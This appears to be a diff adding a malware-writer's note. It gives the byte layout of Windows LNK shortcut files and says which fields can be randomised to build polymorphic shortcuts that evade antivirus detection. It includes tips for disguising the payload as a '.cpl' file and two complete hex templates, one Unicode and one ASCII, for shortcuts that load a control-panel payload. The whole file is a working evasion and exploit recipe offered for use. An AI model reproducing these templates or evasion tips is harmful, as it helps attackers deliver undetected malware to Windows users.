@@ -1,0 +1,93 @@
+Since AV guys read docs instead of code, they miss obvious things.
+Here is the *real* format for LNK files. ;)
+
+Let's make poly LNKs and watch the detections disappear.
+
+00-03  header size, must be 4C 00 00 00
+04-13  clsid, must be 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46
+14     flags, must have bit 0 set, all others can be any value
+15     flags, all bit 1 and 4 can be set in any combination
+16-4b  bytes that can be set to any value
+4c-4d  total size, can be any value <= bytes left in file-2
+4e-4f  record size, can be any value >= sizeof(clsid)+4
+       to make bigger, just add more padding after clsid
+50     type field, must be 1f
+51     unused, can be any value
+52-61  clsid, must be E0 4F D0 20 EA 3A 69 10 A2 D8 08 00 2B 30 30 9D
+       (padding goes here)
+[following offsets will be different if you add more padding to previous record]
+62-63  record size, can be any value >= sizeof(clsid)+4
+       to make bigger, just add more padding after clsid
+64     type field, must be 2e
+65     unused, can be any value
+66-75  clsid, must be 20 20 EC 21 EA 3A 69 10 A2 DD 08 00 2B 30 30 9D
+       (padding goes here)
+[following offsets will be different if you add more padding to previous record]
+76-77  record size, can be any value <= bytes left in file-2
+78-79  unused, can be any value
+7a-7d  icon, must be zero
+
+Unicode format:
+7e-81  must be zero
+82-83  signature, must be 00 6A
+84-8d  unused, can be any value
+8e-??  Unicode path to file
+       remember, if the LNK is on the same drive as the file, no need for a drive letter
+       don't forget to name your file as ".cpl" to be less suspicious
+       path does not need zero-terminate, so you can even remove final zero of Unicode character
+
+ASCII format:
+7e-81  unused, can be any value
+82-??  ASCII path to file
+       remember, if the LNK is on the same drive as the file, no need for a drive letter
+       don't forget to name your file as ".cpl" to be less suspicious
+       path does not need zero-terminate
+
+Here is Unicode example with record padding, loads "\\rgb.cpl":
+
+4C 00 00 00
+01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46
+FF
+ED
+72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 21
+59 00
+18 00
+1F
+72
+E0 4F D0 20 EA 3A 69 10 A2 D8 08 00 2B 30 30 9D
+72 67 62 21
+18 00
+2E
+72
+20 20 EC 21 EA 3A 69 10 A2 DD 08 00 2B 30 30 9D
+72 67 62 21
+27 00
+72 21
+00 00 00 00 00 00 00 00
+00 6A
+72 67 62 21 72 67 62 21 72 21
+5C 00 72 00 67 00 62 00 2E 00 63 00 70 00 6C
+
+Here is ASCII example with record padding, loads "\\rgb.cpl":
+
+4C 00 00 00
+01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46
+FF
+ED
+72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 67 62 21 72 21
+46 00
+18 00
+1F
+72
+E0 4F D0 20 EA 3A 69 10 A2 D8 08 00 2B 30 30 9D
+72 67 62 21
+18 00
+2E
+72
+20 20 EC 21 EA 3A 69 10 A2 DD 08 00 2B 30 30 9D
+72 67 62 21
+14 00
+72 21
+00 00 00 00
+72 67 62 21
+5C 72 67 62 2E 63 70 6C
